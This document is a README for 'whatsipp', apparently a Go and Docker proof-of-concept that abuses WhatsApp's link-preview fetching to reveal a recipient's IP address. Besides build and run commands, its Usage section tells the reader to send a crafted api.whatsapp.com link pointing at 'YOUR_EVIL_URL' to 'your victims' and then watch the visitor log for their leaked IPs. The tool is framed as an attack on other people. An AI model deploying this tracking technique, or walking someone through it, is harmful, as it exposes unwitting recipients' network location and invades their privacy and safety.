## WhatsApp user’s IP disclosure with Link Preview

#### Synopsis

As you know modern messengers have many features besides their main function — texting.
They are able to play/record music/videos, send photos/geolocation and so on.

So they are also capable to generate link previews.
Best practice is to generate preview by external proxy server which will fetch content for you. 

However WhatsApp developers decided to rely on internal web engine that comes with OS.

It's not needed to explain that now WhatsApp will leak your IP address on every received link **AND** also you will leak your IP in link preview mode.  

---
**NOTE: You will need VPS with static IP and domain.**

#### Quickstart - Docker

1. `sudo docker pull unstab1e/whatsipp`
2. `sudo docker run --rm -it -p 80:8080 unstab1e/whatsipp`

#### Setup - Classic way

1. Get the repo by `go get` or `git clone` this repo:
`$ go get https://github.com/moldabekov/whatsipp`
`$ git clone https://github.com/moldabekov/whatsipp`

2. Build binary:
`$ make build`

3. Run it:
`$ sudo W_LEAK_PORT=80 ./main`

#### Setup - Docker from scratch

1. Get the repo by `go get` or `git clone` this repo:
`$ go get https://github.com/moldabekov/whatsipp`
`$ git clone https://github.com/moldabekov/whatsipp`

2. Run container (docker may require root priviledges):
`$ make docker`

#### Usage

To test PoC on yourself:
1. Open WhatApp client and type your URL (*e.g. https://domain.com/leak*)
1. Check logs to see your leaked IP 

To leak other people IP addresses: 
1. Send this link to your victims: https://api.whatsapp.com/send?phone=+**PHONE_NUMBER**&text=http%3A%2F%2F**YOUR_EVIL_URL**

* In separate tab watch IP leaks:
`$ tail -f visitors.log`

#### Screenshots

![WhatsAppPreview](https://user-images.githubusercontent.com/669547/39394182-9232f4da-4af0-11e8-9108-48a16b47e163.jpg)

![visitors](https://user-images.githubusercontent.com/669547/39394174-6f01428c-4af0-11e8-9a9f-12503c95df6b.png)

#### Credits
Greets goes to *Rahul Kankrale* for figuring out.

#### License
(C) MIT License
